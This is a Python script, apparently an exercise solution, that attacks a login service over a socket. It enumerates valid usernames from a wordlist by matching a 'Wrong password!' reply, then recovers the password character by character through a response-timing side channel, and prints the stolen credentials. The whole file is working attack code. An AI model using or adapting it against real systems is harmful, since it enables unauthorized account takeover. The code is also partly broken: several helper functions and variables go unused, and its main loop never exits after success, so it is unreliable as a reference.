import itertools
import json
import socket
import sys
import time

PASSWORD_LIST = "passwords.txt"
LOGIN_LIST = "logins.txt"


def login_generator_from_file(file):
    with open(file, "r") as f:
        content = f.readlines()
    for row in range(len(content)):
        yield content[row].strip("\n")


def password_generator(length):
    """
    Generate a password [a-z0-9]*?
    """
    chars = [x for x in "abcdefghijklmnopqrstuvwxyz0123456789"]

    possibilities = itertools.product(chars, repeat=length)

    return possibilities


def get_connection_data():
    """
    Get the connection data from the user
    """
    ip, port, message = "", "", ""

    # use for command line arguments
    if len(sys.argv) >= 3:
        ip, port = sys.argv[1], sys.argv[2]
    return ip, int(port)


def all_casings(input_string):
    if not input_string:
        yield ""
    else:
        first = input_string[:1]
        if first.lower() == first.upper():
            for sub_casing in all_casings(input_string[1:]):
                yield first + sub_casing
        else:
            for sub_casing in all_casings(input_string[1:]):
                yield first.lower() + sub_casing
                yield first.upper() + sub_casing


def generate_from_file(file):
    with open(file, "r") as f:
        content = f.readlines()
    for row in range(len(content)):
        yield content[row].strip("\n")


def connection(ip=None, port=None):
    if ip is None or port is None:
        ip, port = get_connection_data()
    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

    passwords = generate_from_file(PASSWORD_LIST)
    logins = generate_from_file(LOGIN_LIST)

    response = ""
    right_login = ""
    with socket.socket() as sock:
        try:
            sock.connect((ip, port))
            partial = ""
            for login in logins:
                sock.send(json.dumps({"login": login, "password": ""}).encode())
                response = sock.recv(1024).decode()

                if json.loads(response) == json.loads('{"result": "Wrong password!"}'):
                    right_login = login
                    break

            while True:
                for letter in letters:
                    sending = json.dumps({"login": right_login, "password": partial + letter}).encode()
                    sock.send(sending)
                    before = time.time()
                    response = sock.recv(1024).decode()
                    after = time.time()

                    if response == '{"result": "Connection success!"}':
                        print(json.dumps({"login": right_login, "password": partial + letter}))
                        break

                    if after - before > 0.005:
                        partial += letter

        except ConnectionRefusedError:
            print(response)
        except ConnectionAbortedError:
            sys.exit("Connection aborted [Windows]")


if __name__ == "__main__":
    connection()
